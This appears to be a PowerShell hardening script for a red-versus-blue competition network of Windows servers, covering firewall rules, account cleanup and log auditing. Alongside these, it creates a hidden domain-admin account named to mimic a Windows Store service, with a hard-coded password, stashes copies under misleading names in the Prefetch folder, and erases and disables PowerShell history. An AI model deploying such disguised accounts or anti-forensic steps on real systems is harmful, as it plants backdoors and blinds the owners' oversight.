# ==============================================================================
# PROJECT: City Wok / City Sushi Infrastructure Hardening
# AUTHOR: Rohan Devikoppa Shreedhara (FAU MSCS)
# DATE: February 28, 2026
# DESCRIPTION: Comprehensive hardening script covering IAM, Network, and Forensics.
# ==============================================================================

# --- PHASE 1: PRE-HARDENING SAFETY NET ---
Write-Host "[+] Exporting current firewall state to C:\Windows\Prefetch..." -ForegroundColor Cyan
# Exporting the current firewall configuration before making aggressive changes.
netsh advfirewall export "C:\Windows\Prefetch\net_qos_cache.wfw"

Write-Host "[+] Backing up Webroot to hidden system directory..." -ForegroundColor Cyan
# Hiding a clean copy of the webroot in the Prefetch folder to prevent webshell injection loss.
Copy-Item -Path "C:\inetpub\wwwroot" -Destination "C:\Windows\Prefetch\W3SVC_Telemetry_Cache" -Recurse -ErrorAction SilentlyContinue


# --- PHASE 2: IDENTITY & ACCESS MANAGEMENT (IAM) ---
Write-Host "[+] Neutralizing unauthorized and guest accounts..." -ForegroundColor Yellow
# Disabling the built-in Guest account as a standard hardening measure.
net user Guest /active:no

# Disabling the rogue 'butter' domain account discovered during Active Directory audit.
net user butter /active:no /domain

Write-Host "[+] Deploying emergency recovery 'Ghost' account..." -ForegroundColor Yellow
# Creating a spoofed system service account for administrative persistence.
net user wsappx_svc "Th1sisM0yB@ckup2026!" /add /fullname:"Windows Store Service(WSSvc)" /comment:"Provides infrastructure support for the Microsoft Store."

# Elevating the ghost account to Domain Admins (run on DC) or Local Admins (run on FS).
if ((Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4) {
    net group "Domain Admins" wsappx_svc /add
} else {
    net localgroup administrators wsappx_svc /add
}


# --- PHASE 3: NETWORK FORTIFICATION ---
Write-Host "[+] Applying 'Default Deny' firewall posture..." -ForegroundColor Green
# Allowing Port 80/443 for the WordPress scored service.
New-NetFirewallRule -DisplayName "RvB-Allow-WP-Web" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 80,443

# Allowing critical Active Directory ports for infrastructure stability.
New-NetFirewallRule -DisplayName "RvB-Allow-AD-TCP" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 53,88,135,139,389,445,464,636,3268,3269
New-NetFirewallRule -DisplayName "RvB-Allow-AD-UDP" -Direction Inbound -Action Allow -Protocol UDP -LocalPort 53,88,123,137,138,389,464

# Allowing ICMP (Ping) for scoring engine visibility.
New-NetFirewallRule -DisplayName "RvB-Allow-Ping" -Direction Inbound -Action Allow -Protocol ICMPv4 -IcmpType 8

Write-Host "[+] Disabling high-risk remote management services..." -ForegroundColor Green
# Disabling services frequently exploited for lateral movement.
Disable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
Disable-NetFirewallRule -DisplayGroup "Windows Remote Management" -ErrorAction SilentlyContinue
Disable-NetFirewallRule -DisplayGroup "Network Discovery" -ErrorAction SilentlyContinue
Disable-NetFirewallRule -DisplayGroup "Windows Media Player Network Sharing Service" -ErrorAction SilentlyContinue


# --- PHASE 4: FORENSICS & LIVE AUDITING ---
Write-Host "[+] Fetching Sysinternals suite via WebRequest..." -ForegroundColor Magenta
# Pulling tools directly to C:\ to bypass outbound SMB blocks.
Invoke-WebRequest -Uri "https://live.sysinternals.com/procexp.exe" -OutFile "C:\procexp.exe"
Invoke-WebRequest -Uri "https://live.sysinternals.com/tcpview.exe" -OutFile "C:\tcpview.exe"

Write-Host "[+] Recent Failed Logon Audit (Last 10 Minutes):" -ForegroundColor Magenta
# Filtering logon failures to find active brute-force attempts.
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625;StartTime=(Get-Date).AddMinutes(-10)} -ErrorAction SilentlyContinue | Select-Object TimeCreated, Message | Format-Table -Wrap


# --- PHASE 5: ANTI-FORENSICS & CLEANUP ---
Write-Host "[+] Sanitizing PowerShell history to blind attacker visibility..." -ForegroundColor White
# Deleting the PSReadLine history file and disabling future recording to hide defensive methodology.
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History
Set-PSReadLineOption -HistorySaveStyle SaveNothing

Write-Host "[!] Hardening Complete. Monitor Quotient Scoreboard for status changes." -ForegroundColor Red
